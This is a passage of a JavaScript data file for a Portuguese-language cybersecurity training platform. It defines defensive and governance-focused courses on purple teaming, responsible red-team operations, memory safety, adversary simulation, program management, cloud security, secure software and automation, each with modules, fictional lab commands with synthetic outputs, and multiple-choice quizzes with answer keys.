      { title: "Simulação e detecção", lessons: 5, description: "Comportamentos sintéticos, telemetria, hipóteses e ajuste de regras." },
      { title: "Métricas e melhoria", lessons: 4, description: "Cobertura, qualidade de alerta, tempo de validação e plano de correção." },
    ],
    labsList: [
      { title: "Matriz de cobertura", description: "Relacione um cenário de treinamento às fontes de log disponíveis.", objective: "Identificar lacunas de observabilidade antes de executar uma simulação autorizada.", command: "mapear-cobertura --cenario acesso-atipico --fontes identidade,endpoint", output: "Comportamento: acesso em horário incomum\nDetecção: parcial\nLacuna: contexto de dispositivo\nAção: criar requisito de telemetria" },
      { title: "Revisão de alerta", description: "Avalie o resultado de um exercício sintético de detecção.", objective: "Registrar evidências, falso positivo potencial e melhoria da regra de forma auditável.", command: "revisar-deteccao --exercicio purple-lab-03 --dados sinteticos", output: "Alerta: gerado\nContexto: insuficiente\nAjuste: adicionar origem e papel da conta\nValidação: agendada" },
    ],
    assessment: "Avaliação de colaboração, cobertura, detecção, métricas e melhoria contínua em exercícios purple team.",
    assessmentQuestions: [
      { id: "purple-1", prompt: "O objetivo central de uma operação purple team é:", options: ["Melhorar controles por colaboração e evidências", "Competir sem compartilhar resultados", "Executar ações fora do escopo", "Ocultar telemetria"], correctAnswer: 0, explanation: "Purple team conecta simulação e defesa para produzir melhoria mensurável de prevenção, detecção e resposta." },
      { id: "purple-2", prompt: "Uma lacuna de telemetria indica que:", options: ["Falta informação para observar ou validar um comportamento", "Há incidente confirmado", "Logs devem ser apagados", "O escopo pode ser ignorado"], correctAnswer: 0, explanation: "Lacunas orientam prioridades de coleta e enriquecimento antes de conclusões sobre a capacidade defensiva." },
      { id: "purple-3", prompt: "Uma métrica útil de exercício deve:", options: ["Apoiar decisões de melhoria", "Servir para culpar pessoas", "Substituir evidências", "Eliminar o relatório"], correctAnswer: 0, explanation: "Métricas devem orientar melhorias concretas e ser interpretadas no contexto do cenário e das limitações." },
      { id: "purple-4", prompt: "Dados sintéticos são úteis porque:", options: ["Permitem praticar sem expor dados reais", "Eliminam a necessidade de autorização", "Confirmam incidentes automaticamente", "Substituem controles"], correctAnswer: 0, explanation: "Dados sintéticos reduzem risco de privacidade e tornam exercícios repetíveis e seguros." },
      { id: "purple-5", prompt: "Após ajustar uma detecção, a equipe deve:", options: ["Validar o ajuste e acompanhar seus resultados", "Assumir que está correta sem teste", "Remover os logs", "Encerrar a documentação"], correctAnswer: 0, explanation: "Validação e acompanhamento evitam regras frágeis e ajudam a medir a qualidade da detecção ao longo do tempo." },
    ],
  },
  {
    slug: "red-team-operations", code: "RT-ADV-01", title: "Red Team Operations Responsáveis", shortTitle: "Red Team Ops", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Planejamento, coordenação, evidências e relatório de simulações ofensivas autorizadas com segurança operacional.", focus: "Governança de exercícios, proteção de dados, comunicação e geração de recomendações defensivas sem técnicas de evasão ou acesso indevido.",
    outcomes: ["Projetar um exercício autorizado com riscos, contatos e critérios de parada.", "Coordenar evidências e comunicação durante uma simulação em ambiente isolado.", "Produzir um relatório executivo e técnico proporcional, útil e responsável."],
    modules: [
      { title: "Governança da operação", lessons: 5, description: "Patrocínio, escopo, regras de engajamento, dados, segurança operacional e canais de escalonamento." },
      { title: "Execução controlada", lessons: 5, description: "Checkpoints, registro de decisões, preservação de evidências e coordenação em ambiente de treinamento." },
      { title: "Relato e transformação", lessons: 5, description: "Narrativa do exercício, impacto validado, recomendações, plano de correção e reteste autorizado." },
    ],
    labsList: [
      { title: "Plano operacional do exercício", description: "Construa o plano de uma simulação avançada fictícia.", objective: "Definir objetivos, responsabilidade, tratamento de dados e formas de interromper o exercício com segurança.", command: "planejar-redteam --cenario empresa-treino --governanca completa", output: "Patrocinador: definido\nDados permitidos: sintéticos\nCanal de emergência: ativo\nCritério de parada: impacto não previsto\nStatus: revisão requerida" },
      { title: "Relatório de melhoria", description: "Sintetize evidências de um exercício simulado para públicos técnico e executivo.", objective: "Separar fatos, impacto validado, limitações e ações corretivas priorizadas.", command: "consolidar-relatorio --exercicio RT-ADV-LAB-01 --dados treinamento", output: "Achados: 2\nImpacto validado: moderado\nPrioridade: identidade e segmentação\nReteste: recomendado após correção" },
    ],
    assessment: "Avaliação de governança, execução controlada, evidências e relato de operações red team responsáveis.",
    assessmentQuestions: [
      { id: "rtadv-1", prompt: "Uma operação red team avançada precisa de:", options: ["Patrocínio, escopo e canais de emergência", "Acesso irrestrito", "Ausência de registros", "Dados reais sem proteção"], correctAnswer: 0, explanation: "Exercícios de maior complexidade precisam de governança explícita para proteger pessoas, dados e continuidade." },
      { id: "rtadv-2", prompt: "Checkpoints durante uma simulação servem para:", options: ["Reavaliar risco, escopo e continuidade", "Remover evidências", "Evitar comunicação", "Ignorar condições de parada"], correctAnswer: 0, explanation: "Checkpoints permitem interromper ou ajustar o exercício antes que um desvio gere impacto indevido." },
      { id: "rtadv-3", prompt: "Um impacto relatado deve ser:", options: ["Validado e diferenciado de hipótese", "Exagerado para criar urgência", "Omitido do relatório", "Baseado apenas em suposição"], correctAnswer: 0, explanation: "Separar fatos, inferências e limitações preserva a qualidade e a credibilidade do relatório." },
      { id: "rtadv-4", prompt: "O tratamento de dados em um exercício deve:", options: ["Usar o mínimo necessário e proteger as evidências", "Coletar tudo indiscriminadamente", "Publicar registros", "Dispensar aprovação"], correctAnswer: 0, explanation: "Minimização de dados e proteção de evidências reduzem exposição e atendem às regras de engajamento." },
      { id: "rtadv-5", prompt: "O reteste autorizado tem como função:", options: ["Verificar se a correção reduziu o risco", "Expandir o escopo automaticamente", "Substituir documentação", "Desativar controles"], correctAnswer: 0, explanation: "O reteste confirma a efetividade das melhorias dentro de uma nova autorização e de limites definidos." },
    ],
  },
  {
    slug: "seguranca-memoria-mitigacoes", code: "MEM-SEC-01", title: "Segurança de Memória e Mitigações", shortTitle: "Segurança de Memória", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "blue", icon: "cpu",
    description: "Fundamentos de vulnerabilidades de memória, linguagens mais seguras, compilação defensiva e mitigação moderna.", focus: "Compreensão defensiva de riscos de memória por meio de revisão de código sintético e decisões de engenharia, sem desenvolvimento de exploits.",
    outcomes: ["Explicar por que erros de limites e de ciclo de vida de memória podem gerar risco.", "Relacionar validação, linguagens seguras e ferramentas de análise a redução de vulnerabilidades.", "Priorizar mitigações de compilação, atualização e monitoramento em um cenário fictício."],
    modules: [
      { title: "Memória e risco", lessons: 5, description: "Alocação, limites, ciclo de vida, falhas comuns e impacto no desenho de software." },
      { title: "Construção defensiva", lessons: 5, description: "Validação, bibliotecas seguras, análise estática, testes e opções de compilação protetoras." },
      { title: "Mitigação em produção", lessons: 5, description: "Atualizações, hardening, telemetria, resposta a vulnerabilidades e gestão de risco técnico." },
    ],
    labsList: [
      { title: "Revisão de limites", description: "Analise um trecho sintético com tratamento inseguro de tamanho de entrada.", objective: "Identificar a necessidade de validação e propor um padrão seguro sem executar código vulnerável.", command: "revisar-codigo --amostra memoria-treino --modo defensivo", output: "Validação de tamanho: ausente\nManipulação manual: presente\nRecomendação: validar limites e usar abstração segura\nStatus: correção planejada" },
      { title: "Checklist de mitigação", description: "Priorize controles para uma aplicação fictícia legada.", objective: "Combinar atualização, análise, opções defensivas de compilação e monitoramento em um plano sustentável.", command: "priorizar-mitigacoes --sistema legado-treino --criterio risco", output: "Prioridade 1: atualização suportada\nPrioridade 2: análise estática\nPrioridade 3: hardening de compilação\nAção: validar em homologação" },
    ],
    assessment: "Avaliação de risco de memória, construção defensiva, mitigação e gestão responsável de vulnerabilidades.",
    assessmentQuestions: [
      { id: "memsec-1", prompt: "Erros de limites de memória podem ser reduzidos por:", options: ["Validação de entrada e abstrações seguras", "Ignorar tamanhos", "Desativar testes", "Compartilhar código não revisado"], correctAnswer: 0, explanation: "Validação e práticas de engenharia segura reduzem a chance de manipulações inesperadas de dados." },
      { id: "memsec-2", prompt: "Análise estática de código ajuda a:", options: ["Encontrar padrões de risco antes da execução", "Substituir toda revisão humana", "Remover atualizações", "Ocultar defeitos"], correctAnswer: 0, explanation: "Ferramentas de análise complementam revisão e testes ao sinalizar padrões que merecem investigação." },
      { id: "memsec-3", prompt: "Mitigações de compilação devem ser tratadas como:", options: ["Camadas complementares de defesa", "Substitutas de código seguro", "Razão para dispensar testes", "Controle único suficiente"], correctAnswer: 0, explanation: "Defesa em profundidade combina boas práticas de código, testes, atualizações e controles de plataforma." },
      { id: "memsec-4", prompt: "Uma dependência sem suporte representa:", options: ["Risco que requer plano de atualização ou compensação", "Garantia de segurança", "Motivo para desligar registros", "Dispensa de inventário"], correctAnswer: 0, explanation: "Componentes sem suporte podem permanecer expostos a falhas conhecidas e exigem tratamento de risco." },
      { id: "memsec-5", prompt: "A finalidade deste estudo é:", options: ["Reduzir vulnerabilidades por engenharia defensiva", "Desenvolver ferramentas ofensivas", "Testar sistemas externos", "Evitar documentação"], correctAnswer: 0, explanation: "A formação enfatiza prevenção, revisão, mitigação e resposta responsável a riscos de software." },
    ],
  },
  {
    slug: "adversary-simulation", code: "ADV-SIM-01", title: "Simulação de Adversários", shortTitle: "Adversary Simulation", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Emulação ética de comportamentos em dados sintéticos para validar telemetria, controles e resposta conforme MITRE ATT&CK.", focus: "Cenários autorizados, mapeamento comportamental, colaboração purple team e mensuração de cobertura defensiva.",
    outcomes: ["Transformar um objetivo de segurança em comportamento simulado e observável.", "Mapear hipóteses de detecção a fontes de dados e lacunas de cobertura.", "Documentar resultados, limitações e melhorias de um exercício de emulação."],
    modules: [
      { title: "Cenário e comportamento", lessons: 5, description: "Objetivos, perfis de ameaça, mitigações, mapeamento ATT&CK e limites éticos." },
      { title: "Telemetria e validação", lessons: 5, description: "Dados sintéticos, hipóteses de detecção, contexto, triagem e critérios de evidência." },
      { title: "Cobertura e evolução", lessons: 5, description: "Lacunas, controles compensatórios, métricas, revalidação e aprendizado organizacional." },
    ],
    labsList: [
      { title: "Mapa de emulação", description: "Associe um comportamento sintético a controles e fontes de evidência.", objective: "Definir o que será observado sem executar ações em ativos externos ou em produção.", command: "mapear-emulacao --cenario credencial-treino --dados sinteticos", output: "Comportamento: autenticação atípica\nFontes: identidade e endpoint\nDetecção esperada: correlação de contexto\nLimite: laboratório isolado" },
      { title: "Revisão de cobertura", description: "Avalie os resultados fictícios de uma simulação autorizada.", objective: "Distinguir ausência de alerta, alerta sem contexto e detecção validada para orientar melhorias.", command: "avaliar-cobertura --exercicio ADV-SIM-LAB-02 --somente-leitura", output: "Detecção: presente\nContexto: parcial\nLacuna: enriquecimento de dispositivo\nAção: ajustar regra e revalidar" },
    ],
    assessment: "Avaliação de cenário, mapeamento comportamental, telemetria, cobertura e melhoria de simulações autorizadas.",
    assessmentQuestions: [
      { id: "advsim-1", prompt: "Uma simulação de adversário responsável deve usar:", options: ["Escopo autorizado e dados sintéticos quando possível", "Ambientes externos sem permissão", "Dados pessoais sem controle", "Ausência de registro"], correctAnswer: 0, explanation: "Autorização, isolamento e minimização de dados tornam a emulação segura e útil para a defesa." },
      { id: "advsim-2", prompt: "O mapeamento ATT&CK é útil para:", options: ["Descrever comportamentos e orientar cobertura defensiva", "Substituir políticas", "Confirmar incidentes automaticamente", "Eliminar logs"], correctAnswer: 0, explanation: "A matriz oferece uma linguagem comum para discutir comportamento, telemetria e controles." },
      { id: "advsim-3", prompt: "Uma ausência de alerta pode indicar:", options: ["Uma lacuna a investigar em telemetria ou detecção", "Que não existe risco", "Que o escopo não importa", "Que logs devem ser removidos"], correctAnswer: 0, explanation: "A ausência de sinal precisa ser investigada com contexto antes de qualquer conclusão sobre a capacidade defensiva." },
      { id: "advsim-4", prompt: "Revalidar uma melhoria serve para:", options: ["Confirmar se o controle passou a produzir o resultado esperado", "Encerrar a documentação", "Ampliar o escopo sem autorização", "Dispensar comunicação"], correctAnswer: 0, explanation: "A revalidação mensura se as melhorias realmente reduziram a lacuna identificada." },
      { id: "advsim-5", prompt: "Uma limitação do exercício deve:", options: ["Ser registrada junto aos resultados", "Ser escondida", "Ser confundida com sucesso", "Substituir a métrica"], correctAnswer: 0, explanation: "Limitações explícitas ajudam a interpretar os resultados com responsabilidade e a planejar a próxima iteração." },
    ],
  },
  {
    slug: "security-program-management", code: "SPM-ADV-01", title: "Gestão de Programas de Segurança", shortTitle: "Programa de Segurança", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Estratégia, riscos, métricas, roadmap, orçamento e comunicação executiva para liderar programas de segurança.", focus: "Decisões alinhadas ao negócio, evidências mensuráveis, governança e melhoria contínua de capacidades de segurança.",
    outcomes: ["Traduzir riscos técnicos em prioridades compreensíveis para o negócio.", "Construir um roadmap de segurança com responsáveis, dependências e métricas.", "Comunicar postura, investimento e progresso de forma clara para públicos executivos e técnicos."],
    modules: [
      { title: "Estratégia e governança", lessons: 5, description: "Objetivos, apetite a risco, patrocínio, papéis, políticas e tomada de decisão." },
      { title: "Roadmap e capacidades", lessons: 5, description: "Maturidade, priorização, orçamento, dependências, fornecedores e plano de entrega." },
      { title: "Métricas e comunicação", lessons: 5, description: "Indicadores de risco, eficácia, cobertura, relatório executivo e melhoria contínua." },
    ],
    labsList: [
      { title: "Roadmap de maturidade", description: "Priorize iniciativas de segurança em uma organização fictícia.", objective: "Conectar risco, dono, dependência e indicador em um plano trimestral realista.", command: "montar-roadmap --organizacao treino --horizonte 90d", output: "Prioridade 1: MFA corporativo\nPrioridade 2: inventário de ativos\nDependência: gestão de identidades\nIndicador: cobertura de contas protegidas" },
      { title: "Resumo executivo", description: "Transforme dados técnicos fictícios em uma atualização para liderança.", objective: "Comunicar risco, progresso, decisão necessária e limite de confiança sem jargão excessivo.", command: "resumir-programa --relatorio trimestral-treino --publico executivo", output: "Risco prioritário: acesso privilegiado\nProgresso: 68% de cobertura MFA\nDecisão: aprovar expansão de licenças\nPróxima revisão: 30 dias" },
    ],
    assessment: "Avaliação de estratégia, roadmap, métricas e comunicação de programas de segurança.",
    assessmentQuestions: [
      { id: "spm-1", prompt: "Um programa de segurança eficaz deve estar alinhado a:", options: ["Objetivos de negócio e riscos relevantes", "Somente ferramentas disponíveis", "Preferências individuais", "Ausência de métricas"], correctAnswer: 0, explanation: "O alinhamento garante que investimentos e controles tratem riscos que realmente importam para a organização." },
      { id: "spm-2", prompt: "Um roadmap útil inclui:", options: ["Prioridades, responsáveis, dependências e métricas", "Apenas uma lista de ferramentas", "Ações sem prazo", "Metas sem dono"], correctAnswer: 0, explanation: "Responsáveis, dependências e indicadores tornam o plano executável e acompanhável." },
      { id: "spm-3", prompt: "Uma métrica de segurança deve:", options: ["Apoiar uma decisão ou melhoria", "Existir apenas por relatório", "Substituir análise de risco", "Ser sempre técnica demais para o público"], correctAnswer: 0, explanation: "Boas métricas são contextualizadas e conectadas a decisões, resultados e riscos." },
      { id: "spm-4", prompt: "Comunicação executiva de segurança deve:", options: ["Traduzir risco, impacto e decisão necessária", "Esconder limitações", "Usar jargão sem contexto", "Substituir governança"], correctAnswer: 0, explanation: "Lideranças precisam de clareza sobre risco, progresso e decisões para apoiar o programa." },
      { id: "spm-5", prompt: "Melhoria contínua do programa depende de:", options: ["Medição, revisão e ajuste de prioridades", "Um plano imutável", "Ausência de responsáveis", "Ignorar incidentes e lições"], correctAnswer: 0, explanation: "Programas maduros aprendem com resultados, mudanças de contexto e evidências operacionais." },
    ],
  },
  {
    slug: "cloud-security-operations", code: "CLOUD-OPS-01", title: "Operações de Cloud Security", shortTitle: "Cloud Security Ops", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "network",
    description: "Postura de segurança, identidade, logs e resposta em ambientes de nuvem com foco em decisões operacionais responsáveis.", focus: "Transformar responsabilidade compartilhada em controles verificáveis, telemetria útil e rotinas de melhoria em ambientes fictícios.",
    outcomes: ["Explicar como a responsabilidade compartilhada orienta decisões de proteção.", "Priorizar controles de identidade, configuração e logs para workloads em nuvem.", "Documentar uma investigação e uma melhoria de postura a partir de dados simulados."],
    modules: [
      { title: "Responsabilidade e arquitetura", lessons: 5, description: "Modelos de serviço, responsabilidades, inventário, identidade e limites de confiança." },
      { title: "Postura e observabilidade", lessons: 5, description: "Configurações, chaves, logs, alertas e validação contínua de controles." },
      { title: "Resposta e melhoria", lessons: 4, description: "Triagem, contenção planejada, evidências, comunicação e ações corretivas." },
    ],
    labsList: [
      { title: "Mapa de responsabilidade", description: "Classifique controles em um cenário multicloud fictício.", objective: "Diferenciar responsabilidades do provedor e do cliente sem alterar qualquer ambiente real.", command: "mapear-responsabilidade-cloud --cenario loja-treino --somente-leitura", output: "Identidade: cliente\nSegurança física: provedor\nConfiguração de armazenamento: cliente\nAção: registrar responsáveis por controle" },
      { title: "Triagem de postura", description: "Analise achados sintéticos de configuração e identidade.", objective: "Priorizar uma melhoria usando exposição, criticidade e evidências de logs.", command: "triar-postura-cloud --arquivo achados-treino.json --modo defensivo", output: "Achados: 4\nPrioridade alta: chave de acesso sem rotação\nEvidência: inventário e log de uso\nAção: abrir plano de correção aprovado" },
    ],
    assessment: "Avaliação de responsabilidade compartilhada, identidade, postura, telemetria e resposta em cloud security.",
    assessmentQuestions: [
      { id: "cloudops-1", prompt: "Responsabilidade compartilhada significa que:", options: ["Papéis de proteção variam conforme o serviço e precisam ser definidos", "O provedor cuida de toda configuração do cliente", "Logs não são necessários", "Identidade deixa de ser importante"], correctAnswer: 0, explanation: "A divisão de responsabilidades depende do modelo de serviço; a organização continua responsável por escolhas como identidade, dados e configurações." },
      { id: "cloudops-2", prompt: "Uma prática adequada para chaves de acesso é:", options: ["Usar menor privilégio, rotação e monitoramento", "Compartilhá-las entre equipes", "Incluí-las no código", "Desativar registros de uso"], correctAnswer: 0, explanation: "Chaves precisam de escopo mínimo, ciclo de vida controlado e rastreabilidade de uso." },
      { id: "cloudops-3", prompt: "Uma ferramenta de postura de segurança ajuda a:", options: ["Identificar desvios de configuração e priorizar melhorias", "Substituir toda investigação", "Eliminar a necessidade de inventário", "Ignorar responsabilidade compartilhada"], correctAnswer: 0, explanation: "A postura revela configurações e lacunas; decisões ainda dependem de contexto, validação e responsáveis." },
      { id: "cloudops-4", prompt: "Logs de auditoria em nuvem são importantes porque:", options: ["Apoiam rastreabilidade, triagem e investigação", "Servem apenas para arquivamento", "Substituem MFA", "Devem ser desativados para reduzir dados"], correctAnswer: 0, explanation: "Telemetria de identidade e configuração fornece evidências para detectar e compreender desvios." },
      { id: "cloudops-5", prompt: "Ao tratar um achado de alto risco, a equipe deve:", options: ["Preservar contexto, seguir o processo aprovado e registrar a ação", "Excluir logs imediatamente", "Mudar recursos sem avaliar impacto", "Publicar detalhes do ambiente"], correctAnswer: 0, explanation: "Resposta responsável combina evidências, comunicação, avaliação de impacto e mudanças documentadas." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha de vídeo complementar: Cloud Security Overview", attribution: "Vídeo público externo sobre segurança em nuvem incorporado como material complementar. Capítulos, roteiros, transcrições de apoio, práticas e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=KRu-u47kcmw", embedUrl: "https://www.youtube-nocookie.com/embed/KRu-u47kcmw?rel=0",
      sessions: [
        { moduleIndex: 0, title: "Responsabilidade compartilhada", duration: "≈ 18 min", focus: "Conectar modelo de serviço, inventário e responsabilidade pelos controles.", chapters: [{ time: "00:00", title: "Contexto de nuvem", summary: "Identifique recursos, serviços e limites de responsabilidade." }, { time: "06:00", title: "Modelo compartilhado", summary: "Diferencie proteção da infraestrutura e configuração do cliente." }, { time: "13:00", title: "Decisões de controle", summary: "Priorize identidade, dados e configurações verificáveis." }], transcript: [{ time: "00:00", text: "Segurança em nuvem começa por reconhecer quais recursos existem, quem os administra e quais dados eles processam." }, { time: "06:00", text: "O provedor e o cliente têm papéis distintos; a equipe precisa documentar controles e responsabilidades para cada serviço." }, { time: "13:00", text: "Identidade, configuração e registros de auditoria são escolhas operacionais que permanecem sob governança da organização." }] },
        { moduleIndex: 1, title: "Postura, identidade e logs", duration: "≈ 18 min", focus: "Usar telemetria e critérios de risco para transformar uma descoberta em ação priorizada.", chapters: [{ time: "00:00", title: "Postura contínua", summary: "Observe configurações e desvios como parte da rotina." }, { time: "07:00", title: "Acesso verificável", summary: "Aplique menor privilégio e acompanhe credenciais." }, { time: "14:00", title: "Evidência operacional", summary: "Relacione logs a hipóteses de investigação." }], transcript: [{ time: "00:00", text: "Uma postura madura de segurança combina inventário confiável, padrões de configuração e revisão contínua de desvios." }, { time: "07:00", text: "Acesso mínimo e credenciais rastreáveis reduzem exposição e tornam decisões de investigação mais fundamentadas." }, { time: "14:00", text: "Logs de identidade e alterações de configuração ajudam a construir uma linha do tempo antes de qualquer conclusão." }] },
        { moduleIndex: 2, title: "Resposta com contexto", duration: "≈ 18 min", focus: "Planejar resposta, comunicação e melhoria sem executar ações fora de um ambiente autorizado.", chapters: [{ time: "00:00", title: "Sinal e escopo", summary: "Defina o que foi observado e qual o possível impacto." }, { time: "06:00", title: "Ação coordenada", summary: "Planeje contenção com responsáveis e evidências." }, { time: "13:00", title: "Melhoria verificável", summary: "Converta o aprendizado em ação, dono e prazo." }], transcript: [{ time: "00:00", text: "Um alerta de nuvem é um ponto de partida: primeiro delimite o recurso, a identidade envolvida e o contexto operacional." }, { time: "06:00", text: "A resposta deve preservar evidências e considerar impacto em serviços antes de qualquer mudança de configuração." }, { time: "13:00", text: "Ações corretivas claras, responsáveis definidos e revisão posterior transformam um achado em melhoria duradoura." }] },
      ],
    },
  },
  {
    slug: "software-security-applied", code: "APPSEC-02", title: "Segurança de Software Aplicada", shortTitle: "Software Seguro", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Princípios de SDLC seguro, revisão de código, dependências e critérios de entrega com foco em prevenção de falhas comuns.", focus: "Conectar requisitos, modelagem de ameaças, revisão e observabilidade a decisões de engenharia reproduzíveis em cenários sintéticos.",
    outcomes: ["Relacionar requisitos de segurança a decisões de arquitetura e implementação.", "Avaliar entradas, autorização, segredos e dependências em trechos sintéticos.", "Definir gates de segurança e evidências de revisão para uma entrega de software."],
    modules: [
      { title: "Segurança desde o desenho", lessons: 5, description: "Requisitos, ativos, fluxos, limites de confiança e modelagem de ameaças." },
      { title: "Implementação e revisão", lessons: 5, description: "Validação, autorização, tratamento de erros, segredos e dependências." },
      { title: "Entrega e aprendizagem", lessons: 4, description: "Testes, pipelines, inventário de componentes, logs e correção contínua." },
    ],
    labsList: [
      { title: "Fluxo de dados seguro", description: "Revise o fluxo de uma funcionalidade fictícia de cadastro.", objective: "Identificar ativos, pontos de entrada e controles sem testar aplicações externas.", command: "modelar-fluxo-app --cenario cadastro-treino --modo defensivo", output: "Ativo: dados cadastrais\nEntrada: formulário autenticado\nControle: validação no servidor\nAção: registrar requisito de autorização" },
      { title: "Checklist de pull request", description: "Avalie alterações sintéticas antes da publicação.", objective: "Verificar autorização, tratamento de dados e dependências sem executar código não confiável.", command: "revisar-entrega --mudanca PR-TREINO-42 --somente-leitura", output: "Validação: presente\nSegredo no código: não\nDependência: revisão requerida\nStatus: solicitar evidência de teste" },
    ],
    assessment: "Avaliação de desenho seguro, revisão de implementação, dependências, entrega e melhoria contínua de software.",
    assessmentQuestions: [
      { id: "appsec-1", prompt: "Modelagem de ameaças é mais útil quando:", options: ["É feita cedo e atualizada conforme o sistema muda", "É usada apenas após um incidente", "Substitui testes", "Ignora fluxos de dados"], correctAnswer: 0, explanation: "O processo ajuda a antecipar riscos a partir de ativos, fluxos e limites de confiança antes da implementação." },
      { id: "appsec-2", prompt: "Validação de entrada deve ocorrer principalmente:", options: ["No lado do servidor, de acordo com regras esperadas", "Somente no navegador", "Depois de salvar o dado", "Apenas para administradores"], correctAnswer: 0, explanation: "Controles no servidor não dependem do cliente e podem aplicar formatos, limites e regras de negócio de forma consistente." },
      { id: "appsec-3", prompt: "Uma decisão correta sobre segredos é:", options: ["Gerenciá-los fora do código e restringir seu acesso", "Inseri-los em commits", "Mostrá-los em mensagens de erro", "Compartilhá-los em planilhas públicas"], correctAnswer: 0, explanation: "Cofres e mecanismos de injeção reduzem a exposição e favorecem rotação e auditoria." },
      { id: "appsec-4", prompt: "Uma lista de componentes ajuda a equipe a:", options: ["Conhecer dependências e agir diante de vulnerabilidades", "Eliminar a necessidade de testes", "Desativar atualizações", "Dispensar autorização"], correctAnswer: 0, explanation: "Inventário de componentes oferece visibilidade sobre bibliotecas, versões e impactos de correções." },
      { id: "appsec-5", prompt: "Um gate de segurança em pipeline deve:", options: ["Produzir evidência e orientar uma decisão de entrega", "Publicar segredos", "Substituir revisão humana sempre", "Ignorar resultados de testes"], correctAnswer: 0, explanation: "Automação apoia consistência, mas os resultados precisam de contexto e um processo claro de tratamento." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha de vídeo complementar: Segurança de Software e OWASP", attribution: "Playlist pública externa sobre fundamentos de segurança de software e OWASP incorporada como material complementar. Alguns vídeos podem estar em inglês; capítulos, transcrições, práticas e avaliações são autorais e em português da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/playlist?list=PLEqTHftpM91OZzAIOwMcAuQ4ciK1n4_Ll", embedUrl: "https://www.youtube-nocookie.com/embed/videoseries?list=PLEqTHftpM91OZzAIOwMcAuQ4ciK1n4_Ll&rel=0",
      sessions: [
        { moduleIndex: 0, title: "Segurança como requisito", duration: "≈ 20 min", focus: "Relacionar ativos, fluxos e limites de confiança a requisitos de segurança verificáveis.", chapters: [{ time: "00:00", title: "Por que software seguro", summary: "Conecte segurança a confiança, continuidade e qualidade." }, { time: "07:00", title: "Ativos e fluxos", summary: "Mapeie o que precisa de proteção antes de implementar." }, { time: "14:00", title: "Ameaças como perguntas", summary: "Transforme preocupações em controles e critérios de teste." }], transcript: [{ time: "00:00", text: "Segurança de software é uma prática de engenharia: ela começa ao entender dados, funções e consequências de uma falha." }, { time: "07:00", text: "Fluxos de dados e limites de confiança mostram onde a aplicação recebe, transforma e expõe informações sensíveis." }, { time: "14:00", text: "Uma ameaça bem descrita orienta uma pergunta verificável e evita que a revisão se torne apenas uma lista genérica." }] },
        { moduleIndex: 1, title: "Controles de implementação", duration: "≈ 20 min", focus: "Reconhecer padrões defensivos para validação, autorização, erros e segredos.", chapters: [{ time: "00:00", title: "Entrada sob controle", summary: "Defina formatos, limites e regras aceitas pelo servidor." }, { time: "07:00", title: "Autorização explícita", summary: "Verifique permissões para cada ação e recurso." }, { time: "14:00", title: "Erros e segredos", summary: "Evite exposição de detalhes e credenciais em código." }], transcript: [{ time: "00:00", text: "Entradas confiáveis são uma suposição perigosa; o sistema precisa validar o que espera receber em cada operação." }, { time: "07:00", text: "Autenticar alguém não autoriza todas as ações; a verificação precisa estar próxima do recurso protegido." }, { time: "14:00", text: "Mensagens de erro para usuários devem ser úteis sem revelar dados internos, chaves ou detalhes de infraestrutura." }] },
        { moduleIndex: 2, title: "Entrega com evidências", duration: "≈ 18 min", focus: "Usar revisão, testes e inventário de componentes para reduzir risco antes e depois da publicação.", chapters: [{ time: "00:00", title: "Revisão colaborativa", summary: "Use critérios claros e registros de decisão." }, { time: "06:00", title: "Componentes conhecidos", summary: "Acompanhe dependências e sua manutenção." }, { time: "13:00", title: "Aprendizagem contínua", summary: "Converta falhas e métricas em melhorias de engenharia." }], transcript: [{ time: "00:00", text: "Uma revisão de qualidade busca evidências de que requisitos funcionais e de segurança foram considerados antes da entrega." }, { time: "06:00", text: "Dependências precisam de origem, versão e propósito conhecidos para que a equipe avalie correções e exposição." }, { time: "13:00", text: "A melhoria de software seguro depende de feedback, registro de decisões e ajustes repetíveis no processo de entrega." }] },
      ],
    },
  },
  {
    slug: "security-automation-operations", code: "AUTO-SEC-01", title: "Automação Segura para Operações", shortTitle: "Automação Segura", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "cpu",
    description: "Scripting, validações, logs e revisões para automatizar rotinas repetitivas de segurança sem perder controle operacional.", focus: "Projetar automações pequenas, auditáveis e reversíveis para ambientes de treinamento, com limites claros de escopo e execução.",
    outcomes: ["Definir entradas, saídas e critérios de parada para uma automação segura.", "Aplicar validação, menor privilégio e logs em rotinas operacionais.", "Revisar uma automação por evidências, impacto e possibilidade de reversão."],
    modules: [
      { title: "Automação com propósito", lessons: 4, description: "Casos de uso, escopo, responsáveis, dados permitidos e critérios de parada." },
      { title: "Controles no script", lessons: 4, description: "Validação de entradas, privilégios mínimos, segredos, logs e tratamento de falhas." },
      { title: "Operação revisável", lessons: 4, description: "Testes, revisão por pares, agendamento aprovado, monitoramento e reversão." },
    ],
    labsList: [
      { title: "Plano de rotina", description: "Desenhe uma automação fictícia de inventário de endpoints.", objective: "Definir dados permitidos, responsável, frequência e condição de parada sem acessar nenhum ativo real.", command: "planejar-automacao --rotina inventario-treino --escopo laboratorio", output: "Escopo: endpoints sintéticos\nPermissão: leitura\nResponsável: operações\nParada: resultado inesperado\nStatus: pronto para revisão" },
      { title: "Revisão de saída", description: "Analise a saída de uma tarefa simulada de coleta de logs.", objective: "Verificar se o registro contém contexto suficiente e se não expõe dados sensíveis.", command: "revisar-automacao --execucao AUTO-LAB-02 --modo auditoria", output: "Entradas validadas: sim\nDados sensíveis: mascarados\nLog de execução: completo\nAção: aprovar para teste controlado" },
    ],
    assessment: "Avaliação de escopo, validação, privilégios, logs, revisão e reversão em automações de segurança.",
    assessmentQuestions: [
